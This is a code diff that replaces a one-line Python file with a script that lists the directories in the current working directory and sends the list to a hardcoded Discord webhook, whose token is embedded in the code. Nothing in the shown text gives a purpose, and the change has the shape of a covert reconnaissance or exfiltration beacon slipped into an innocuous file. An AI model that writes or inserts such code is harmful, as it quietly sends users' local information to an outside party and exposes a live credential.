@@ -1,1 +1,48 @@
-print('null')
+import os
+import json
+import http.client
+
+# === CONFIG ===
+directory_path = "."  # Current directory
+webhook_url = "https://discord.com/api/webhooks/1412652259464183870/Q6sUf0lJhO2Z4E-fvDdvpU2oO3lRvXYRmRgs7Q-fsdXJNm3UD-3Y9U6lydSjMLmVMn9m"
+
+# === Manually parse webhook URL ===
+# Example URL: https://discord.com/api/webhooks/{id}/{token}
+def parse_webhook_url(url):
+    # Remove scheme (https://)
+    if url.startswith("https://"):
+        url = url[len("https://"):]
+    elif url.startswith("http://"):
+        url = url[len("http://"):]
+
+    # Split at first slash to get hostname and path
+    parts = url.split("/", 1)
+    hostname = parts[0]
+    path = "/" + parts[1] if len(parts) > 1 else "/"
+    return hostname, path
+
+hostname, path = parse_webhook_url(webhook_url)
+
+# === Get directory listing ===
+directories = [d for d in os.listdir(directory_path) if os.path.isdir(os.path.join(directory_path, d))]
+directory_list_text = "\n".join(directories) or "No directories found."
+
+# === Prepare webhook payload ===
+payload = {
+    "content": f"📂 List of directories in `{directory_path}`:\n```{directory_list_text}```"
+}
+json_payload = json.dumps(payload)
+
+# === Send HTTP POST ===
+conn = http.client.HTTPSConnection(hostname)
+headers = {"Content-Type": "application/json"}
+conn.request("POST", path, body=json_payload, headers=headers)
+response = conn.getresponse()
+
+# === Output result ===
+if response.status == 204:
+    print("✅ Message sent to Discord.")
+else:
+    print(f"❌ Failed to send message. Status: {response.status} {response.reason}")
+
+conn.close()
